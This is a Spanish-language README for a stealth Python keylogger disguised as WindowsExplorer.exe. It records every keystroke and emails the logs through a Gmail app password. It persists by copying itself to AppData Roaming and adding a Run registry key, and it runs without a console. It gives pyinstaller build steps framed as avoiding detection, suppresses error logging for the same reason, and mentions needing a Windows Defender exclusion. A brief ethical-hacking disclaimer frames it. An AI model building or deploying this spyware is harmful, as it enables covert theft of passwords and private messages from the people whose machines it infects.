# **Registrador de teclas Full Stealth v1**

**Resumen del proyecto**
El registrador de teclas Full Stealth (disfrazado de WindowsExplorer) es un **registrador de teclas basado en Python** diseñado para **hacking ético, investigación en ciberseguridad y fines educativos**. Este registrador de teclas captura las pulsaciones de teclas y **envía registros por correo electrónico cada 15 pulsaciones (personalizable)** en lugar de depender de un intervalo de tiempo.

Además, el script garantiza la persistencia mediante:
- **Moviéndonos** a `C:\Users\<usuario>\AppData\Roaming\WindowsExplorer.exe`
- **Añadiendo una entrada al registro de Windows** para la ejecución al inicio
- **Ejecutándose **silenciosamente en segundo plano** sin consola visible

## **Características**

✅ **Registra cada pulsación de tecla**: Captura las pulsaciones del usuario y las almacena en la memoria. ✅ **Envío automático de pulsaciones de teclas por correo electrónico**: Envía los registros tras **15 pulsaciones de teclas** (personalizable).

✅ **Mecanismo de persistencia**: Se traslada a la **carpeta itinerante AppData** y crea una **entrada de registro de Windows** para ejecutarse al inicio.

✅ **Ejecución en segundo plano**: Se ejecuta **silenciosamente sin resultados visibles**.

✅ **Compatibilidad con la contraseña de la aplicación de Google**: Utiliza una **contraseña de la aplicación de Google** para enviar correos electrónicos de forma segura.

---

## **Instalación y configuración**

### **Paso 1: Instalar dependencias**
Asegúrate de tener Python instalado. Luego, instala la biblioteca necesaria:
```bash
pip install pynput
```

### **Paso 2: Convertir el script en ejecutable**
Para evitar la detección y garantizar su ejecución independiente, **convierte el script en un ejecutable de Windows** usando `pyinstaller`:
```bash
pyinstaller --onefile --noconsole --hidden-import=pynput WindowsExplorer.py
```
- `--onefile`: Empaqueta todo en **un ejecutable independiente**
- `--noconsole`: Evita que el programa abra una ventana de consola
- `--hidden-import=pynput`: Garantiza que `pynput` se incluya correctamente

Después de ejecutar el comando, el **ejecutable final** estará en la carpeta `dist` como `WindowsExplorer.exe`.

---

## **Funcionalidad y cómo funciona**

1️⃣ **Mecanismo de registro de teclas**
- Cada **15 pulsaciones de teclas** (personalizable), las pulsaciones se **envían a un correo electrónico**.
- Admite **teclas especiales (INTRO, ESPACIO, RETROCESO, etc.)**.
- Utiliza **Google App Password** para la autenticación.

2️⃣ **Configuración de persistencia**
- **Se traslada a AppData Roaming**
```
C:\Users\<usuario>\AppData\Roaming\WindowsExplorer.exe
```
- **Añade una clave de registro para la ejecución al inicio**
```registry
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
```
- Esto garantiza que, incluso si el sistema se reinicia, el keylogger se **inicie automáticamente al arrancar**.

3️⃣ **Ejecución en modo oculto**
- Se ejecuta **silenciosamente en segundo plano** sin mostrar ventanas ni mensajes.
- **Sin registro de errores** para evitar la detección.

---

## **Cómo ejecutarlo en una máquina virtual de destino**

1. **Transfiera `WindowsExplorer.exe` a la máquina virtual**.
2. **Ejecútelo manualmente una vez** (esto configura la persistencia, aunque puede requerir una exclusión única de Windows Defender).
3. **Reinicie la máquina virtual** para comprobar si se inicia automáticamente.
4. El keylogger ahora se ejecutará **en segundo plano en cada inicio**.

---

## **Opciones de personalización**

¿Desea cambiar el **número de pulsaciones de teclas antes de enviar registros**? Modifique esta línea en `WindowsExplorer.py`:
```python
self.key_limit = 15 # Cambie este valor a cualquier número
```

Para **cambiar el correo electrónico y la contraseña**, actualice:
```python
self.email = "your-email@gmail.com"
self.password = "your-google-app-password"
```

---

## **Notas importantes**

- Este proyecto es solo para **hacking ético, investigación en ciberseguridad y fines educativos**.
- Se **recomienda probarlo en un entorno controlado (por ejemplo, una máquina virtual)**.
- Si **Google 2FA está habilitado**, se debe usar una **contraseña de la aplicación de Google** en lugar de la contraseña normal.

---

## **Descargo de responsabilidad**
Esta herramienta **solo debe usarse en entornos donde tenga permiso explícito** para hacerlo. No me hago responsable del mal uso** de este software.